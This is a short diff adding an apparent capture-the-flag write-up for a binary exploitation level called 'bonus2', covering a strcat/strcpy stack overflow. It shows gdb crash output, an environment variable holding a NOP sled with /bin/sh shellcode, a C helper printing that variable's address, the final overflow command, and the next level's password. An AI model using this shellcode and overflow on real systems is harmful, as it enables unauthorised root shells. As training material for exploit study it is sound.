@@ -1,0 +1,55 @@
+We see in source that there is no calling bin/sh
+Just have
+1. 2 functions - main and greetuser
+2. Comparing memories of args with memcmp
+3. have one global variable language
+4. have not more functions
+5. Using strcpy
+6. Using getenv than to get value from Environment's
+constant
+
+And using strcat to put str to buffer and
+puts it.
+We could to overflow strcat and find new offset
+for using own commands.
+Than to check it - run bonus2 with long argument
+
+gdb bonus
+r AaaaaaaaaAaaaaaaaaAaaaaaaaaAaaaaaaaaAaaaaaaaaAaaaaaaaaAaaaaaaaaAaaaaaaaaAaaaaaaaaAaaaaaaaaAaaaaaaaaAaaaaaaaaAaaaaaaaaAaaaaaaaaAaaaaaaaaAaaaaaaaaAaaaaaaaaAaaaaaaaaAaaaaaaaaAaaaaaaaa AaaaaaaaaAaaaaaaaaAaaaaaaaaAaaaaaaaaAaaaaaaaaAaaaaaaaaAaaaaaaaaAaaaaaaaaAaaaaaaaaAaaaaaaaaAaaaaaaaaAaaaaaaaaAaaaaaaaaAaaaaaaaaAaaaaaaaaAaaaaaaaaAaaaaaaaaAaaaaaaaaAaaaaaaaaAaaaaaaaaAaaaaaaaaAaaaaaaaaAaaaaaaaaAaaaaaaaaAaaaaaaaaAaaaaaaaaAaaaaaaaaAaaaaaaaaAaaaaaaaaAaaaaaaaaAaaaaaaaaAaaaaaaaaAaaaaaaaaAaaaaaaaaAaaaaaaaaAaaaaaaaaAaaaaaaaaAaaaaaaaaAaaaaaaaaAaaaaaaaa
+
+In result we are see SegFault with memory address:
+Program received signal SIGSEGV, Segmentation fault.
+0x08006161 in ?? ()
+
+I think we could to fill first and second arguments
+overflow and launch our script of offset of gets which
+will be in env/LANG
+
+export `python -c 'print "LANG=nl" + "\x90" * 1000 + "\x31\xc9\xf7\xe9\x51\x04\x0b\xeb\x08\x5e\x87\xe6\x99\x87\xdc\xcd\x80\xe8\xf3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x2f\x73\x68"'`
+
+x90 - for overflow stack
+and + our script to get root via offset
+
+We could to overflow second argument and launch
+our script of root via offset.
+
+How to find address of SHELLCODE than to send 
+with second arg?
+
+Write script in C to find his address:
+
+with NANO:
+#include <stdio.h>
+#include <stdlib.h>
+
+int	main(void)
+{
+	printf("%p\n", getenv("LANG"));
+	return 0;
+}
+
+Here is filling first two arguments and put address of env LANG which writing back to right.
+./bonus2 `python -c 'print "A" * 200'` `python -c 'print "B" * 23 + "\x44\xfb\xff\xbf"[::]'`
+
+cat /home/user/bonus3/.pass
+71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
